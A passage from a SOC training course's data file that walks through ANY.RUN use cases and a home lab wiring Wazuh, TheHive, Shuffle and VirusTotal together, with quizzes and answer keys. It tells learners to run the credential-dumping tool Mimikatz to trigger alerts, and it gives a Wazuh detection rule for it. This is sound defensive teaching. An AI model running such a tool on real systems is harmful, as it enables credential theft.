                  <strong>Behavioral Analysis:</strong> An in-depth look at how the malware interacts with the system, including process creation, network communications, and file modifications.
                </li>
                <li>
                  <strong>Indicators of Compromise (IOCs):</strong> A list of IOCs, including file hashes, IP addresses, and domain names, that can be used to detect the malware in other environments.
                </li>
                <li>
                  <strong>Static and Dynamic Analysis Results:</strong> Insights gathered from both static code analysis and dynamic behavior observation.
                </li>
              </ul>
              <p>
                <strong>Example Report Structure:</strong>
              </p>
              <ul>
                <li>
                  <strong>Executive Summary:</strong> A concise overview of the threat and recommended remediation steps.
                </li>
                <li>
                  <strong>Technical Details:</strong> Detailed logs, screenshots, and timeline of events.
                </li>
                <li>
                  <strong>Remediation Recommendations:</strong> Specific actions to isolate and remediate the threat.
                </li>
              </ul>
              <p>
                <strong>Sample Pseudo-Code for Report Generation:</strong>
              </p>
              <pre>{`function generateReport(analysisData) {
      const report = {
        summary: analysisData.summary,
        details: analysisData.details,
        iocs: analysisData.iocs,
        recommendations: analysisData.recommendations
      };
      exportToPDF(report);
    }
    
    generateReport(analysisData);`}</pre>
              <p>
                Comprehensive reports facilitate effective communication with stakeholders and ensure that critical information is documented for future reference.
              </p>
            </>
          )
        },
        {
          title: "Practical Applications of ANY.RUN",
          summary: (
            <>
              <p><strong>Practical Applications of ANY.RUN</strong></p>
              <p>
                ANY.RUN is a versatile tool with numerous applications in the Security Operations Center (SOC). It is used for malware detection, threat hunting, and incident response, among other functions.
              </p>
              <p>
                <strong>Use Cases Include:</strong>
              </p>
              <ul>
                <li>
                  <strong>Malware Detection and Identification:</strong> Quickly analyze suspicious files to determine if they are malicious. For example, if an endpoint detection system flags a file, it can be uploaded to ANY.RUN for further analysis.
                </li>
                <li>
                  <strong>Threat Hunting:</strong> Search for specific indicators of compromise (IOCs) across public tasks. Analysts can filter tasks by hash, file type, or verdict to find related threats.
                </li>
                <li>
                  <strong>Incident Response:</strong> In the event of a security breach, ANY.RUN helps analysts understand the scope of the infection by revealing detailed behavioral data. This information is vital for isolating affected systems and mitigating further damage.
                </li>
                <li>
                  <strong>Training and Research:</strong> The interactive environment of ANY.RUN makes it an excellent tool for cybersecurity education and research, enabling students and professionals to learn from real-world malware behavior.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> During an incident, a SOC team might use ANY.RUN to analyze a suspicious file collected from a compromised endpoint. The analysis reveals that the file attempts to contact multiple external domains associated with known C2 servers. The team then uses this information to update firewall rules and block the malicious domains, effectively containing the threat.
              </p>
              <p>
                ANY.RUN’s flexible and interactive analysis capabilities make it a valuable asset for improving overall threat detection and response processes in any SOC.
              </p>
            </>
          )
        },
        {
          title: "Conclusion",
          summary: (
            <>
              <p><strong>Conclusion and Final Thoughts on ANY.RUN</strong></p>
              <p>
                ANY.RUN is a powerful and innovative platform for malware analysis, offering interactive and detailed insights that are essential for modern SOC operations. Its real-time interactivity, comprehensive reporting, and advanced filtering capabilities enable analysts to gain a deep understanding of malicious behaviors.
              </p>
              <p>
                Whether used for threat hunting, incident response, or educational purposes, ANY.RUN equips cybersecurity professionals with the tools they need to effectively detect, analyze, and mitigate threats. Its integration into the SOC workflow enhances overall security posture and enables rapid, informed responses to potential incidents.
              </p>
              <p>
                In summary, ANY.RUN is a critical asset for any organization looking to strengthen its defenses against sophisticated malware and cyber threats. Its robust features and user-friendly interface make it a top choice for analysts and researchers alike.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is the primary use of AnyRun in a SOC?",
            options: [
              "Dynamic malware analysis",
              "Graphic design",
              "Database management",
              "Social media monitoring"
            ],
            correctAnswer: "Dynamic malware analysis"
          }
        ]
      }
    },
    {
      id: "module12",
      title: "Simulating a SOC Environment at Home",
      sections: [
        {
          title: "Objectives",
          summary: (
            <>
              <img
                src="/Learning Paths/SOC/homelab1.png"
                alt="homelab1"
                className="max-w-4xl w-full h-auto border border-gray-300 rounded-lg p-2 shadow-md mx-auto"
              />
              <p className="mt-8"></p>
              <p><strong>Project Objectives</strong></p>
              <p>
                The goal of this project is to create a Wazuh instance integrated with a SOAR (Security Orchestration, Automation, and Response) platform. This setup will allow for automated threat detection, incident response, and security monitoring within a controlled lab environment.
              </p>
              <p className="mt-4"></p>
              <p><strong>Key Objectives Include:</strong></p>
              <ul>
                <li>
                  <strong>Deploying Wazuh:</strong> Set up and configure Wazuh for log collection, analysis, and security monitoring.
                </li>
                <li>
                  <strong>SOAR Integration:</strong> Integrate a SOAR solution to automate security workflows and incident response.
                </li>
                <li>
                  <strong>Rule Development:</strong> Create and fine-tune detection rules to identify security incidents accurately.
                </li>
                <li>
                  <strong>Simulated Threats:</strong> Test the environment by simulating attacks and evaluating the automated response.
                </li>
              </ul>
              <p>
                By the end of this project, you will have a fully functional security monitoring and response system that mirrors real-world SOC operations.
              </p>
              <p className="mt-4 text-xl font-semibold">Resources We Will Use in This Project:</p>
              <ul className="text-xl">
                <li>
                  <a
                    href="https://wazuh.com/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600"
                  >
                    Wazuh
                  </a>
                </li>
                <li>
                  <a
                    href="https://strangebee.com/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600"
                  >
                    Strangebee
                  </a>
                </li>
                <li>
                  <a
                    href="https://shuffler.io/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600"
                  >
                    Shuffler
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.virustotal.com/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600"
                  >
                    VirusTotal
                  </a>
                </li>
                <li>
                  <a
                    href="https://azure.microsoft.com/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600"
                  >
                    Microsoft Azure
                  </a>
                </li>
              </ul>
            </>
          )
        },
        {
          title: "Wazuh Setup",
          summary: (
            <>
              <img
        src="/Learning Paths/SOC/wazuh.png"
        alt="homelab2"
        className="max-w-xl w-full h-auto border border-gray-300 rounded-lg p-2"
      />
              <p className="mt-4">
                Wazuh is an open-source platform for threat detection and incident response, renowned for its adaptability and integration capabilities. The development team continuously enhances the platform, supported by rigorous testing and auditing processes.
              </p>
              <p className="mt-4"></p>
              <p><strong>VM Configuration:</strong></p>
              <ul>
                <li>Created an Ubuntu Server 20.04 VM on Azure.</li>
                <li>Configured with 2 vCPUs, 8GB RAM, and 64GB storage.</li>
                <li>Connected to the VM via SSH using Azure CLI.</li>
              </ul>
              <p className="mt-4"></p>
              <p><strong>Installation:</strong></p>
              <pre className="bg-black text-white p-4">
{`# Set root password
sudo passwd root
su -
        
# Update system
apt-get update && apt-get upgrade
        
# Install Wazuh
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a`}
              </pre>
              <p className="mt-4"></p>
              <p>
                After installation, access the Wazuh dashboard using the provided URL:{" "}
                <a href="https://wazuh-dashboard-ip:443" target="_blank" rel="noopener noreferrer">
                  https://wazuh-dashboard-ip:443
                </a>.
              </p>
              <p>
                Configured Azure inbound port rules to allow access to the Wazuh dashboard.
              </p>
              <p className="mt-6"></p>
              <img
                src="/Learning Paths/SOC/homelab10.png"
                alt="homelab1"
                className="max-w-8xl w-full h-auto border border-gray-300 rounded-lg p-2"
              />
            </>
          )
        },
        {
          title: "TheHive Setup",
          summary: (
            <>
              <img
        src="/Learning Paths/SOC/TheHive.jpg"
        alt="homelab2"
        className="max-w-xl w-full h-auto border border-gray-300 rounded-lg p-2"
      />
              <p className="mt-4">
              TheHive is an open-source Security Incident Response Platform (SIRP) designed to help Security Operations Centers (SOCs), Computer Security Incident Response Teams (CSIRTs), and cybersecurity professionals efficiently manage and respond to security incidents. It provides a centralized platform for tracking, analyzing, and resolving security alerts and incidents, making it an essential tool for modern incident response workflows.
              </p>
              <p>
              <p className="mt-4"></p>
                To deploy TheHive, a powerful incident response platform, it is essential to configure a Virtual Machine (VM) with sufficient resources and install its dependencies, including Elasticsearch and Cassandra. Elasticsearch, in particular, requires a minimum of 4 CPU cores to function properly. During my setup, I encountered issues with Elasticsearch failing to start due to insufficient CPU allocation, which led me to reconfigure 4 VMs before achieving the desired setup.
              </p>
              <p className="mt-4">
                <strong>Create an Ubuntu VM on Azure:</strong>
              </p>
              <ul>
                <li>Select Ubuntu Server 20.04 as the operating system.</li>
                <li>
                  Allocated 4 vCPUs, 8GB RAM, and 64GB storage to meet the resource requirements for Elasticsearch and Cassandra.
                </li>
                <li>Enabled SSH access for remote management.</li>
              </ul>
              <p className="mt-4">
                <strong>Connect to the VM via SSH:</strong>
              </p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`ssh username@public-ip`}
              </pre>
              <p className="mt-4">
                <strong>Update System and Set Root Password:</strong>
              </p>
              <p>Changed the root password for secure access:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`sudo passwd root`}
              </pre>
              <p>Switched to the root user:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`su -`}
              </pre>
              <p>Updated the system packages:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`apt-get update && apt-get upgrade -y`}
              </pre>
              <p className="mt-4">
                <strong>Step 2: Install Dependencies</strong>
              </p>
              <p><strong>Install Required Packages:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`apt install wget gnupg apt-transport-https git ca-certificates ca-certificates-java curl software-properties-common python3-pip lsb-release -y`}
              </pre>
              <p className="mt-4"><strong>Install Java:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`wget -qO- https://apt.corretto.aws/corretto.key | sudo gpg --dearmor -o /usr/share/keyrings/corretto.gpg
        echo "deb [signed-by=/usr/share/keyrings/corretto.gpg] https://apt.corretto.aws stable main" | sudo tee -a /etc/apt/sources.list.d/corretto.sources.list
        sudo apt update
        sudo apt install java-common java-11-amazon-corretto-jdk -y
        echo JAVA_HOME="/usr/lib/jvm/java-11-amazon-corretto" | sudo tee -a /etc/environment
        export JAVA_HOME="/usr/lib/jvm/java-11-amazon-corretto"`}
              </pre>
              <p className="mt-4"><strong>Install Cassandra:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`wget -qO - https://downloads.apache.org/cassandra/KEYS | sudo gpg --dearmor -o /usr/share/keyrings/cassandra-archive.gpg
        echo "deb [signed-by=/usr/share/keyrings/cassandra-archive.gpg] https://debian.cassandra.apache.org 40x main" | sudo tee -a /etc/apt/sources.list.d/cassandra.sources.list
        sudo apt update
        sudo apt install cassandra -y`}
              </pre>
              <p className="mt-4"><strong>Install Elasticsearch:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg
        sudo apt-get install apt-transport-https -y
        echo "deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list
        sudo apt update
        sudo apt install elasticsearch -y`}
              </pre>
              <p className="mt-4"><strong>Install TheHive:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`wget -O- https://archives.strangebee.com/keys/strangebee.gpg | sudo gpg --dearmor -o /usr/share/keyrings/strangebee-archive-keyring.gpg
        echo 'deb [signed-by=/usr/share/keyrings/strangebee-archive-keyring.gpg] https://deb.strangebee.com thehive-5.2 main' | sudo tee -a /etc/apt/sources.list.d/strangebee.list
        sudo apt-get update
        sudo apt-get install -y thehive`}
              </pre>
              <p className="mt-4">
                <strong>Step 3: Configure Services</strong>
              </p>
              <p><strong>Configure Cassandra:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`nano /etc/cassandra/cassandra.yaml
        
        # Update the following parameters with the server's public IP:
        listen_address: <public-ip>
        rpc_address: <public-ip>
        seed_provider:
          - class_name: org.apache.cassandra.locator.SimpleSeedProvider
            parameters:
              - seeds: "<public-ip>"`}
              </pre>
              <p>Restart Cassandra:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`systemctl stop cassandra.service
        rm -rf /var/lib/cassandra/*
        systemctl enable cassandra.service
        systemctl start cassandra.service`}
              </pre>
              <p className="mt-4"><strong>Configure Elasticsearch:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`nano /etc/elasticsearch/elasticsearch.yml
        
        # Uncomment and update the following parameters:
        cluster.name: my-cluster
        node.name: my-node
        network.host: <public-ip>
        
        # Start Elasticsearch:
        systemctl start elasticsearch
        systemctl enable elasticsearch`}
              </pre>
              <p className="mt-4"><strong>Verify Services:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`systemctl status cassandra.service
        systemctl status elasticsearch`}
              </pre>
              <p className="mt-4">
                <strong>Step 4: Configure TheHive</strong>
              </p>
              <p>Set File Permissions:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`chown -R thehive:thehive /opt/thp`}
              </pre>
              <p>Edit TheHive Configuration:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`nano /etc/thehive/application.conf
        
        # Update the following parameters with the server's public IP:
        hostname = "<public-ip>"
        application.baseUrl = "http://<public-ip>:9000"`}
              </pre>
              <p>Start TheHive:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`systemctl start thehive
        systemctl enable thehive
        systemctl status thehive`}
              </pre>
              <p className="mt-4">
                <strong>Step 5: Access TheHive</strong>
              </p>
              <p>Navigated to TheHive dashboard using the URL:</p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`http://<public-ip>:9000`}
              </pre>
              <p className="mt-4"></p>
              <img
  src="/Learning Paths/SOC/homelab2.png"
  alt="homelab2"
  className="max-w-screen-2xl w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
/>
              <p className="mt-4"></p>
              <p>Verified that all services (Cassandra, Elasticsearch, and TheHive) were running correctly.</p>
              <p className="mt-6"></p>



            </>
          )
        }
        
        ,
        {
          title: "Setting Up Custom Alerts in Wazuh",
          summary: (
            <>
              <p className="mt-4 font-bold">Step 1: Configuring the Wazuh Dashboard</p>
              <p>
                <strong>Access the Wazuh Dashboard:</strong> Navigate to the Wazuh Dashboard using the provided URL (e.g.,{" "}
                <a
                  href="https://wazuh-dashboard-ip:443"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-600 underline"
                >
                  https://wazuh-dashboard-ip:443
                </a>
                ). Log in using the credentials created during the Wazuh installation.
              </p>
              <p className="mt-4"><strong>Add a Windows Agent:</strong></p>
              <p>Click on <em>Add Agent</em> in the Wazuh Dashboard.</p>
              <img
                src="/Learning Paths/SOC/homelab3.png"
                alt="homelab3"
                className="max-w-2xl w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              <p>
                Select <strong>Windows</strong> as the agent type. Enter the Wazuh Public Server Address (e.g., 1.1.1.1). The dashboard will generate a PowerShell command to install the Wazuh agent on the Windows machine.
              </p>
              <p className="mt-4"><strong>Install the Wazuh Agent on Windows:</strong></p>
              <p>
                Open PowerShell as Administrator on the Windows 10 machine and run the generated command. For example:
              </p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.1-1.msi -OutFile \${env.tmp}\\wazuh-agent; msiexec.exe /i \${env.tmp}\\wazuh-agent /q WAZUH_MANAGER='1.1.1.1' WAZUH_AGENT_NAME='mydfir' WAZUH_REGISTRATION_SERVER='1.1.1.1'`}
              </pre>
              <p className="mt-4"><strong>Start the Wazuh service:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`net start wazuhsvc`}
              </pre>
              <p className="mt-4">
                Verify Agent Connection: Return to the Wazuh Dashboard and confirm that the Windows agent is connected. The dashboard will now display events and alerts from the Windows machine.
              </p>
              <img
                src="/Learning Paths/SOC/homelab4.png"
                alt="homelab4"
                className="max-w-2xl w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              
              <p className="mt-4 font-bold">Step 2: Setting Up Custom Alerts for Mimikatz</p>
              <p>
                <strong>Download and Run Mimikatz:</strong> Mimikatz is a well-known tool used for credential dumping and privilege escalation. Download Mimikatz and extract it on the Windows machine. Run Mimikatz using PowerShell to simulate an attack.
              </p>
              <p className="mt-4">
                <strong>Wazuh Detects Mimikatz:</strong> Wazuh will detect the execution of Mimikatz and generate an event.
              </p>
              <img
                src="/Learning Paths/SOC/homelab5.png"
                alt="homelab4"
                 className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              <p>
                However, by default, Wazuh may not provide detailed information about the event.
              </p>
              <p className="mt-4">
                <strong>Create a Custom Rule for Mimikatz:</strong> Navigate to the Wazuh Dashboard, go to <em>Management &gt; Rules &gt; Manage Rules Files &gt; Custom Rules</em>, and click the Edit (pencil) icon to modify the custom rules file. Add the following rule to detect Mimikatz:
              </p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`<rule id="100003" level="15">
          <if_group>sysmon_event1</if_group>
          <field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\\.exe</field>
          <description>Mimikatz Usage Detected</description>
          <mitre>
            <id>T1003</id>
          </mitre>
        </rule>`}
              </pre>
              <p className="mt-4">
                Save the changes and restart the Wazuh manager to apply the new rule:
              </p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`systemctl restart wazuh-manager`}
              </pre>
              <p className="mt-4">
                <strong>Test the Custom Rule:</strong> Run Mimikatz again on the Windows machine. Return to the Wazuh Dashboard and observe the event. It should now include the custom description and MITRE ATT&CK technique ID (T1003).
              </p>
              <img
                src="/Learning Paths/SOC/homelab6.png"
                alt="homelab5"
                className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
            </>
          )
        }
        ,
        {
          title: "Integrating Shuffle",
          summary: (
            <>
            
              <img
                src="/Learning Paths/SOC/saffle.png"
                alt="shaffle"
                className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <p>
                This section explains how to integrate Shuffle, a SOAR (Security Orchestration, Automation, and Response) platform, with Wazuh and VirusTotal to automate threat detection and response workflows. By leveraging Shuffle, you can streamline the process of receiving alerts, parsing data, and performing actions like reputation checks using VirusTotal.
              </p>
        
              <p className="mt-4 font-bold">Step 1: Setting Up Shuffle</p>
              <p><strong>Create a Shuffle Account:</strong></p>
              <ul>
                <li>Navigate to the Shuffle platform and create a new account.</li>
                <li>Log in to your Shuffle workspace.</li>
              </ul>
              <p className="mt-4"><strong>Create a New Workflow:</strong></p>
              <ul>
                <li>In Shuffle, create a new workflow to automate the response process.</li>
                <li>Name the workflow (e.g., "Wazuh-VirusTotal Integration").</li>
              </ul>
        
              <p className="mt-4 font-bold">Step 2: Configure Wazuh to Send Alerts to Shuffle</p>
              <p><strong>Add a Webhook Integration in Wazuh:</strong></p>
              <p>
                In the Wazuh configuration, add a webhook integration to send alerts to Shuffle. Edit the Wazuh configuration file (e.g., <code>/var/ossec/etc/ossec.conf</code>) and add the following block:
              </p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`<integration>
          <name>shuffle</name>
          <hook_url>WEBHOOK_URL</hook_url>
          <rule_id>100003</rule_id>
          <alert_format>json</alert_format>
        </integration>`}
              </pre>
              <p>
                Replace <code>WEBHOOK_URL</code> with the webhook URL provided by Shuffle. The <code>rule_id</code> corresponds to the custom rule created earlier for Mimikatz detection.
              </p>
              <p className="mt-4"><strong>Restart Wazuh Services:</strong></p>
              <pre className="bg-black text-white p-4 overflow-x-auto max-w-screen-md whitespace-pre-wrap mx-auto">
        {`systemctl restart wazuh-manager`}
              </pre>
              <p className="mt-4"><strong>Test the Integration:</strong></p>
              <p>
                Run Mimikatz on the Windows machine to trigger an alert. Verify that the alert is sent to Shuffle via the webhook.
              </p>
        
             
        
              <p className="mt-4 font-bold">Step 3: Execute the Workflow</p>
              <ul>
                <li>
                  <strong>Trigger the Workflow:</strong> Run Mimikatz on the Windows machine to generate a Wazuh alert. The alert is sent to Shuffle via the webhook.
                </li>
                <li>
                  <strong>Parse the Alert:</strong> Shuffle uses Regex to extract the SHA-256 hash from the Wazuh alert.
                </li>
                <li>
                  <strong>Query VirusTotal:</strong> Shuffle sends the extracted hash to VirusTotal for reputation analysis. VirusTotal returns the analysis results (e.g., detection rate, file details).
                </li>
                <li>
                <p className="mt-6"></p>
                  <strong>Take Action:</strong> Based on the VirusTotal results, Shuffle can:
                  <ul>
                    <li>Create an alert in TheHive.</li>
                    <li>Notify analysts via email or chat (e.g., Slack, Microsoft Teams).</li>
                    <li>Add the hash to a blocklist.</li>
                  </ul>
                </li>
              </ul>
        
              <p className="mt-4 font-bold">Step 4: Verify the Integration</p>
              <ul>
                <li>
                  <strong>Check Shuffle Logs:</strong> Verify that the workflow executed successfully and that the VirusTotal query returned the expected results.
                </li>
                <li>
                  <strong>Review Actions:</strong> Confirm that the appropriate actions (e.g., alerts, notifications) were taken based on the VirusTotal analysis.
                </li>
              </ul>
              <p className="mt-6"></p>
              <img
                src="/Learning Paths/SOC/homelab7.png"
                alt="homelab7"
                className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              <p className="mt-6"></p>
              <p className="mt-4 font-bold">Example Workflow in Shuffle</p>
              <ul>
                <li>
                  <strong>Wazuh Alert:</strong> Wazuh detects Mimikatz execution and sends an alert to Shuffle via the webhook.
                </li>
                <li>
                  <strong>Regex Parsing:</strong> Shuffle extracts the SHA-256 hash from the alert using Regex.
                </li>
                <li>
                  <strong>VirusTotal Query:</strong> Shuffle sends the hash to VirusTotal for analysis.
                </li>
                <li>
                  <strong>Response Actions:</strong> If VirusTotal identifies the file as malicious, Shuffle:
                  <ul>
                    <li>Creates a case in TheHive.</li>
                    <li>Sends a notification to the SOC team.</li>
                  </ul>
                </li>
              </ul>
            </>
          )
        }
        ,
        {
          title: "TheHive with Shuffle",
          summary: (
            <>
              <p className="mt-4 font-bold">
                Integrating TheHive with Shuffle for Case Management
              </p>
              <p>
                This section explains how to integrate TheHive, an incident response platform, with Shuffle to automate the creation of alerts and cases. By connecting these tools, you can streamline the process of managing security incidents—ensuring that alerts from Wazuh and other sources are automatically logged and tracked in TheHive.
              </p>
              
              <p className="mt-4 font-bold">Step 1: Configure TheHive for Integration</p>
              <p>
                <strong>Log into TheHive:</strong> Access your TheHive instance using the URL (e.g., <code>http://&lt;public-ip&gt;:9000</code>) and log in with your administrator credentials.
              </p>
              <p className="mt-4"><strong>Create User Accounts:</strong></p>
              <ul>
                <li>Create a personal analyst account for manual case management.</li>
                <li>Create a SOAR user account for automated integrations (e.g., Shuffle).</li>
              </ul>
              <p className="mt-4"><strong>Generate an API Key:</strong></p>
              <p>
                Navigate to the SOAR user account settings in TheHive and generate an API key for the SOAR user. This key will be used to authenticate Shuffle with TheHive.
              </p>
              
              <p className="mt-4 font-bold">Step 2: Add TheHive to Shuffle Workflow</p>
              <p>
                <strong>Log into Shuffle:</strong> Access your Shuffle workspace and open the workflow you created earlier (e.g., "Wazuh-VirusTotal Integration").
              </p>
              <p className="mt-4"><strong>Add TheHive App:</strong></p>
              <p>
                In Shuffle, add the TheHive app to your workflow. Authenticate the app using the API key generated in TheHive and provide the public IP of your TheHive instance.
              </p>
              <p className="mt-4"><strong>Configure the Action:</strong></p>
              <p>
                Set up an action in Shuffle to create an alert in TheHive. Configure the alert with the following details:
              </p>
              <ul>
                <li>
                  <strong>Date:</strong> Use a custom date (e.g., the current date and time).
                </li>
                <li>
                  <strong>Description:</strong> Include a detailed description of the alert (e.g., "Mimikatz detected on Windows machine").
                </li>
                <li>
                  <strong>Summary:</strong> Provide a brief summary of the incident.
                </li>
                <li>
                  <strong>Tags:</strong> Add relevant tags (e.g., Mimikatz, Credential Dumping, T1003).
                </li>
                <li>
                  <strong>Title:</strong> Set a descriptive title for the alert (e.g., "Mimikatz Execution Detected").
                </li>
              </ul>
              
              <p className="mt-4 font-bold">Step 3: Execute the Workflow</p>
              <ul>
                <li>
                  <strong>Trigger the Workflow:</strong> Run Mimikatz on the Windows machine to generate a Wazuh alert. The alert is sent to Shuffle via the webhook.
                </li>
                <li>
                  <strong>Parse and Enrich Data:</strong> Shuffle extracts the relevant data (e.g., SHA-256 hash) and queries VirusTotal for reputation analysis.
                </li>
                <li>
                  <strong>Create an Alert in TheHive:</strong> Shuffle sends the enriched data to TheHive and creates an alert with the configured details (date, description, summary, tags, and title).
                </li>
                <li>
                  <strong>Verify the Alert:</strong> Log into TheHive and navigate to the Alerts section. Confirm that the alert was successfully created with the correct details.
                </li>
              </ul>
              <p className="mt-6"></p>
              <img
                src="/Learning Paths/SOC/homelab8.png"
                alt="homelab8"
                className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              <p className="mt-6"></p>
              <p className="mt-4 font-bold">Step 4: Review the Alert in TheHive</p>
              <p>
                <strong>Alert Details:</strong> The alert in TheHive will include the title, description, tags, and a link to the VirusTotal analysis (if included in the workflow). Analysts can convert the alert into a case for further investigation.
              </p>
              <p className="mt-4">
                <strong>Case Creation and Automated Actions:</strong> Analysts can convert the alert into a case for investigation, or TheHive can automatically assign tasks, notify analysts, or trigger additional workflows based on the alert.
              </p>
              
              <p className="mt-4 font-bold">Example Workflow in Shuffle and TheHive</p>
              <ul>
                <li>
                  <strong>Wazuh Alert:</strong> Wazuh detects Mimikatz execution and sends an alert to Shuffle.
                </li>
                <li>
                  <strong>Shuffle Workflow:</strong> Shuffle parses the alert, extracts the SHA-256 hash, and queries VirusTotal. Then, it sends the enriched data to TheHive to create an alert.
                </li>
                <li>
                  <strong>TheHive Alert:</strong> An alert is created in TheHive with the configured details.
                </li>
                <li>
                  <strong>Analyst Action:</strong> Analysts review the alert, convert it into a case, and begin the investigation.
                </li>
              </ul>
              <p className="mt-6"></p>
              <img
                src="/Learning Paths/SOC/homelab9.png"
                alt="homelab9"
                className="max-w-2x2 w-full h-auto border border-gray-300 rounded-lg p-2 float-left"
              />
              <div style={{ clear: "both", marginTop: "1rem" }}></div>
              <p className="mt-6"></p>
              <p className="mt-4 font-bold">Key Takeaways</p>
              <ul>
                <li>
                  <strong>TheHive Integration:</strong> Shuffle can automatically create alerts in TheHive, ensuring that incidents are logged and tracked.
                </li>
                <li>
                  <strong>Custom Alerts:</strong> Alerts in TheHive can include detailed descriptions, summaries, tags, and titles for better organization.
                </li>
                <li>
                  <strong>Automation:</strong> The integration eliminates manual steps, allowing analysts to focus on investigation and response.
                </li>
                <li>
                  <strong>Scalability:</strong> This setup can handle large volumes of alerts, making it suitable for enterprise environments.
                </li>
              </ul>
              
              <p className="mt-4 font-bold">Benefits of This Integration</p>
              <ul>
                <li>
                  <strong>Centralized Incident Management:</strong> TheHive provides a single platform for tracking and managing security incidents.
                </li>
                <li>
                  <strong>Improved Efficiency:</strong> Automating alert creation reduces manual effort and speeds up response times.
                </li>
                <li>
                  <strong>Enhanced Collaboration:</strong> Analysts can collaborate on cases in TheHive, improving teamwork and knowledge sharing.
                </li>
                <li>
                  <strong>Customizable Workflows:</strong> Shuffle workflows can be tailored to meet specific organizational needs.
                </li>
              </ul>
              
              <p className="mt-4">
                By integrating TheHive with Shuffle, you create a powerful incident response platform that enhances your SOC’s ability to detect, analyze, and respond to security incidents in real time. This setup ensures that alerts are automatically logged, enriched, and tracked—enabling faster and more effective incident response.
              </p>
            </>
          )
        }
        ,
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is the primary goal of this project?",
            options: [
              "Deploying Wazuh and integrating it with a SOAR platform",
              "Building a personal website",
              "Creating a social media campaign",
              "Developing a mobile app"
            ],
            correctAnswer: "Deploying Wazuh and integrating it with a SOAR platform"
          },
          {
            id: 2,
            question: "Which tool is used for incident response and case management in this project?",
            options: [
              "Wazuh",
              "TheHive",
              "Shuffle",
              "VirusTotal"
            ],
            correctAnswer: "TheHive"
          },
          {
            id: 3,
            question: "What is the minimum number of CPU cores required to run Elasticsearch in this setup?",
            options: [
              "2",
              "4",
              "8",
              "16"
            ],
            correctAnswer: "4"
          },
          {
            id: 4,
            question: "Which command is used to install the Wazuh agent on a Windows machine?",
            options: [
              "curl -sO https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.1-1.msi",
